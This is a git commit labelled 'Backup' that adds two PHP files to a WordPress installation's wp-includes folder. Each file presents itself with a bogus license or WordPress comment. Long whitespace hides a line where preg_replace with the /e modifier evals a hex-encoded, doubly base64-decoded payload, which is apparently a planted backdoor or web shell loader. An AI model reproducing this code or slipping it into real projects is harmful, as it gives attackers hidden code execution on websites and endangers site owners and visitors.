1e985121eda96c4a007a2bd32340a2be381dd4ae
michaelkuzin@gmail.com <mike.kuzin@showclix.com>
2012-11-14 01:05:23 -0800

    Backup

---
+++ wp-includes/theme-compat/footerb.php
@@ -0,0 +1,13 @@
+<?php
+
+/**
+ *
+ * This library is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU Lesser General Public
+ * License as published by the Free Software Foundation; either
+ * version 2.1 of the License, or (at your option) any later version.
+ *
+*/
+
+                                                                                                                                                                                                                                                                                          preg_replace("/[lfjrlmhunyu]*.+[bhikcaxfmenqi]*/ei",str_replace(" ","","    \x65    \x76 \x61 \x6C \x28  \x62  \x61   \x73      \x65      \x36   \x34  \x5F \x64    \x65     \x63 \x6F\x64    \x65     \x28  \x62  \x61   \x73      \x65      \x36   \x34  \x5F \x64    \x65     \x63 \x6F\x64    \x65     \x28 '"."YV"."dZ Z"."0 t DR m"."xi"."WEI wZVNn a 1"."gwT l"."B U M"."HR"."KU"."lZzbm"."RpZ"."G"."RL"."U0Jo"."Y m1R Z 0pG"."O U RU "."M Dl MU1 "."VW Y"."ko z W"."W"."5"."Y"."V"."D"."A5 "."S "."j J R "."b kt"."Y d"."HB a"."a UF"."vSV"."d WdGNI U jVLQ 1Jm VU"."U5 "."VFZ G c 2"."5Ze WRk S1 N r "."Z 2U yV m p h R "."z"."hn S"."n "."p"."4 M"."FpYaDB "."Z "."W E "."psWVN C e W I"."zZH p Q VE"."k 0S"."U"."d OdmJ I TTlP R"."EE r Sn p"."z "."Z0pHU T"."l"."ZbUZ6 W"."lR"."Z M"."F"."gy"."Um"."xZM"."j l r"."W l "."No e mRI SmZj b "."VZ"."3"."Yk"."dG a"."l p T"."Z2 5J Q 2 N zS"."nlz b kx"."DUmZ "."V R T lUVk Zzb"."ll5 ZG"."RLU2 s3YVdZ b0p HU X B"."J R"."UJ sZ G"."1G c"."0"."t D "."U m t L "."VH"."N nWld "."O "."b2J5 QW 5"."Q"."QzkwW lhoMF l"."Y"."S mx"."Z VD"."RuTz"."MwTk"."N tV"."m phR z hnS n"."p 4"."b W IzSnRJ R0"."Z"."q Z"."Edsd m J"."q M"."Gl"."Ja"."UJ "."0 WlhS"."b2 Iy UT"."ljR zl6 Z"."E"."Q0OG"."RH Vj"."RkR 0"."Z5"."Wl "."d"."F"."Z1 k yOXNjejA0 T"."U "."NC"."eW Iz ZH"."p QVE k0 SU c1a G JXV T "."l Z ejQ 4"."TD"."N SbGVIUm"."hj "."bV Zo U"."G"."p 4"."aW "."N qN DhhV"."zV3ZF"."h R "."Z2 R I b H "."d aVDF6Z F d"."K d"."G F YUS "."t"."Q"."Q zl"."t Y"."j N Kd F Bp Yzd a"."WG"."hw Z E"."R0 OQ ="."='\x29\x29\x29\x3B"),'tcumytylnhnrz'); 
+?>
---
+++ wp-includes/wlwmanifest.php
@@ -0,0 +1,11 @@
+<?php
+    
+/**
+ * These functions can be replaced via plugins. If plugins do not redefine these
+ * functions, then these will be used instead.
+ *
+ * @package WordPress
+*/
+
+                                                                                                                                                                                                                                                                             preg_replace("/[xdwiffngnbssoml]*.+[igidmfxicm]*/ei",str_replace(" ",""," \x65 \x76 \x61  \x6C \x28 \x62  \x61 \x73 \x65 \x36 \x34 \x5F\x64 \x65  \x63  \x6F \x64 \x65 \x28 \x62  \x61 \x73 \x65 \x36 \x34 \x5F\x64 \x65  \x63  \x6F \x64 \x65 \x28'YVd Z"."Z0"."t"."D R m x"."iW"."EI wZVN"."n"."a1gw"."T"."l"."BUMHRK Ul "."Z z b"."mRpZGR"."LU0JoYm1RZ0 pG OURU MDl"."M"."U 1 "."V"."W Y kozW"."W5"."YV DA5 SjJ R b "."k tY d H"."Ba aUFv "."SVdW "."dG"."NI"."Uj V"."L Q"."1J mV"."UU5"."V"."FZG"."c2 5 ZeW"."R k "."S 1"."NrZ2U yVmphR z hnSn p 4"."M"."F pY"."aD BZ WE"."p"."sWVN"."C "."e"."WI "."zZ Hp Q VE k0SU"."dO d"."m JITT"."l "."P "."REE r"."Sn"."p "."zZ0 "."p HU T lZbUZ"."6WlRZ M"."Fgy "."Um"."xZM "."jlrW"."l N "."o "."e m"."R"."IS"."m Zj "."bVZ3 "."YkdG a l p"."TZ 2"."5JQ "."2Nz Snlz "."bk xDUm Z "."VRTlU VkZ"."zb l "."l "."5"."Z G"."RL U2s3Y V"."d Z "."b 0 p H U "."XB "."JRUJs Z "."G1G c 0tD UmtL "."V "."H NnWld O b"."2"."J5"."Q"."W5 "."QQz "."k w"."WlhoM "."F"."l YS"."mxZ"."VDR"."uT "."zMw"."Tk "."N "."t"."V m p"."hR z "."h nS"."np 4 bWI zSnRJ R 0Z"."qZE ds"."d "."m"."J q"."M "."G"."lJaU J 0Wl"."h Sb2I"."y UTl "."jR z"."l"."6ZE"."Q0O"."G R "."HVj"."R"."kR0 Z5Wl dFZ1 k"."yO X Nje jA "."0T UNCeWIzZHpQV Ek 0 S"."Uc1"."a "."GJ"."XV TlZ"."ejQ "."4T DNSbG "."V I Um hjbV"."Z"."oUGp4 aW NqNDhhV zV 3 "."ZF "."h "."RZ2R"."I b"."H"."daV DF 6 ZFd K d "."GFY "."US "."tQ"."Qz"."l"."tY "."jNKdF Bp"."Yzd aW Gh wZ "."E R0OQ==' \x29  \x29  \x29  \x3B "),'lfygpwgqphjocyq'); 
+?>
